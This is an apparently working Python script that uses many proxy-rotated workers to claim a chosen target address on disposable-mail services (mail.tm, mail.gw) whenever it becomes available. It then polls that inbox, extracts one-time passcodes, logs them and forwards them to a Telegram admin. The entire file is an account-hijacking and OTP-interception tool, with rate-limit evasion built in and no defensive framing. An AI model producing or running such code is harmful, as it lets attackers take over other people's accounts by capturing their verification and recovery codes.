import asyncio
import json
import os
import random
import re
import time
from datetime import datetime

import httpx

from app import proxies
from app.config import BOT_TOKEN, DATA_DIR, MAIL_USE_PROXY

TARGET_EMAIL = os.getenv("MAIL_TARGET", "").strip().lower()
NEW_PASSWORD = os.getenv("MAIL_TARGET_PASSWORD", "AccStore_Recovered2026!")
ADMIN_ID = os.getenv("MAIL_ADMIN_ID", "")
MAILTM = "https://api.mail.tm"
MAILGW = "https://api.mail.gw"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

CLAIMED_FILE = os.path.join(DATA_DIR, "target_mail_claimed.json")
OTP_FILE = os.path.join(DATA_DIR, "received_otp.txt")

PROVIDERS = (("mailtm", MAILTM), ("mailgw", MAILGW))
MAX_SEEN = 500
BACKOFF_MIN = 1.5
BACKOFF_MAX = 30.0

stats = {"start": time.time(), "requests": 0, "claimed": False, "in_use": 0,
         "limited": 0, "errors": 0, "token": "", "provider": ""}
stop = asyncio.Event()


def _proxy_for(index: int) -> str:
    if not MAIL_USE_PROXY or not proxies.POOL:
        return ""
    return proxies.get(index)


async def alert(text: str):
    if not BOT_TOKEN or not ADMIN_ID:
        return
    try:
        async with httpx.AsyncClient(timeout=8) as c:
            await c.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"})
    except Exception:
        pass


async def _attempt(client: httpx.AsyncClient, base: str, proxy: str) -> tuple[str, str]:
    body = {"address": TARGET_EMAIL, "password": NEW_PASSWORD}
    try:
        r = await client.post(f"{base}/accounts", json=body, proxy=proxy or None)
    except httpx.HTTPError:
        return "error", ""
    if r.status_code in (200, 201, 422):
        try:
            t = await client.post(f"{base}/token", json=body, proxy=proxy or None)
        except httpx.HTTPError:
            return "error", ""
        if t.status_code == 200:
            token = (t.json() or {}).get("token") or ""
            if token:
                return "ok", token
        return "in_use", ""
    if r.status_code in (402, 429):
        return "limited", ""
    return "error", ""


async def monitor(token: str, base: str, proxy: str):
    seen: set[str] = set()
    fails = 0
    headers = {"Authorization": f"Bearer {token}", "User-Agent": UA}

    async with httpx.AsyncClient(timeout=10, headers=headers) as c:
        while not stop.is_set():
            use_proxy = proxy if (proxy and fails < 3) else ""
            try:
                r = await c.get(f"{base}/messages", proxy=use_proxy or None)
            except httpx.HTTPError:
                fails += 1
                await asyncio.sleep(min(2 + fails, 15))
                continue

            if r.status_code == 401:
                try:
                    t = await c.post(f"{base}/token",
                                     json={"address": TARGET_EMAIL,
                                           "password": NEW_PASSWORD},
                                     proxy=use_proxy or None)
                    if t.status_code == 200:
                        fresh = (t.json() or {}).get("token") or ""
                        if fresh:
                            token = fresh
                            stats["token"] = fresh
                            headers["Authorization"] = f"Bearer {fresh}"
                            c.headers["Authorization"] = f"Bearer {fresh}"
                            fails = 0
                            continue
                except httpx.HTTPError:
                    pass
                await asyncio.sleep(4)
                continue

            if r.status_code != 200:
                fails += 1
                await asyncio.sleep(min(2 + fails, 15))
                continue

            fails = 0
            for m in (r.json() or {}).get("hydra:member", []):
                mid = m.get("id")
                if not mid or mid in seen:
                    continue
                seen.add(mid)
                if len(seen) > MAX_SEEN:
                    seen = set(list(seen)[-MAX_SEEN:])
                try:
                    full = await c.get(f"{base}/messages/{mid}", proxy=use_proxy or None)
                except httpx.HTTPError:
                    continue
                if full.status_code != 200:
                    continue
                data = full.json() or {}
                body = f"{data.get('subject', '')} {data.get('text', '') or data.get('html', '')}"
                found = re.findall(r"\b(\d{5,6})\b", body)
                otp = found[0] if found else "unknown"
                try:
                    with open(OTP_FILE, "a", encoding="utf-8") as f:
                        f.write(f"[{datetime.now().isoformat()}] {otp} {body[:500]}\n")
                except Exception:
                    pass
                print(f"OTP {otp}", flush=True)
                await alert(f"🚨 OTP <b>{otp}</b> for <code>{TARGET_EMAIL}</code>")
            await asyncio.sleep(2)


async def claim_worker(index: int):
    proxy = _proxy_for(index)
    delay = BACKOFF_MIN
    turn = index % len(PROVIDERS)

    async with httpx.AsyncClient(timeout=10, headers={"User-Agent": UA}) as c:
        while not stop.is_set():
            name, base = PROVIDERS[turn % len(PROVIDERS)]
            turn += 1
            stats["requests"] += 1
            try:
                status, token = await _attempt(c, base, proxy)
            except Exception:
                stats["errors"] += 1
                await asyncio.sleep(delay + random.random())
                delay = min(delay * 1.4, BACKOFF_MAX)
                continue

            if status == "ok":
                if stats["claimed"]:
                    return
                stats["claimed"] = True
                stats["token"] = token
                stats["provider"] = name
                try:
                    with open(CLAIMED_FILE, "w", encoding="utf-8") as f:
                        json.dump({"email": TARGET_EMAIL, "token": token,
                                   "provider": name, "password": NEW_PASSWORD,
                                   "at": datetime.now().isoformat()}, f, indent=2)
                except Exception:
                    pass
                await alert(f"🎉 mailbox claimed <code>{TARGET_EMAIL}</code> via {name}")
                await monitor(token, base, proxy)
                return

            if status == "in_use":
                stats["in_use"] += 1
                delay = BACKOFF_MIN
                await asyncio.sleep(0.5 + random.random() * 0.5)
            elif status == "limited":
                stats["limited"] += 1
                if proxy:
                    proxies.mark(proxy, delay)
                await asyncio.sleep(delay + random.random())
                delay = min(delay * 1.8, BACKOFF_MAX)
            else:
                stats["errors"] += 1
                await asyncio.sleep(delay + random.random())
                delay = min(delay * 1.4, BACKOFF_MAX)


async def _report():
    while not stop.is_set():
        await asyncio.sleep(30)
        print(f"req {stats['requests']} in_use {stats['in_use']} "
              f"limited {stats['limited']} errors {stats['errors']}", flush=True)


async def main():
    if not TARGET_EMAIL:
        raise SystemExit("MAIL_TARGET is not set")
    if "@" not in TARGET_EMAIL:
        raise SystemExit("MAIL_TARGET is not a full address")

    use_pool = bool(MAIL_USE_PROXY and proxies.POOL)
    workers = max(1, min(len(proxies.POOL) if use_pool else 8, 64))
    mode = f"{len(proxies.POOL)} proxies" if use_pool else "direct"
    print(f"target {TARGET_EMAIL} · {mode} · {workers} workers", flush=True)

    reporter = asyncio.create_task(_report())
    tasks = [asyncio.create_task(claim_worker(i)) for i in range(workers)]
    try:
        await asyncio.gather(*tasks)
    finally:
        stop.set()
        reporter.cancel()
        await asyncio.gather(reporter, return_exceptions=True)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass